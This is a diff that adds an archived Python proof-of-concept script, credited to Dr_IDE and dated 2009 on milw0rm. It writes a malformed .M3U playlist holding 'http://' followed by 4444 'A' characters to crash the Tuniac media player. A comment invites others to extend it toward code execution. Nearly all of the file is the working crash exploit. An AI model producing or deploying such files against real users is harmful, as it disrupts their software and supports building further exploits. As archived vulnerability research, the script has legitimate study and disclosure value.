@@ -1,0 +1,19 @@
+#!/usr/bin/env python
+
+##############################################################################################
+#
+# Tuniac v.090517c (.M3U) Crash PoC
+# Found By: Dr_IDE
+# http://sourceforge.net/projects/tuniac/files/tuniac/090517/Tuniac_Setup_090517c.exe/download
+# Notes: Not sure if code execution is possible though. Maybe someone else can finish it off.
+#
+##############################################################################################
+
+# Play around here, anything seems to knock it out.
+buffer = ("http://" + "\x41" * (4444));
+
+f = open('Dr_IDE.M3U','w');
+f.write(buffer);
+f.close();
+
+# milw0rm.com [2009-08-05]
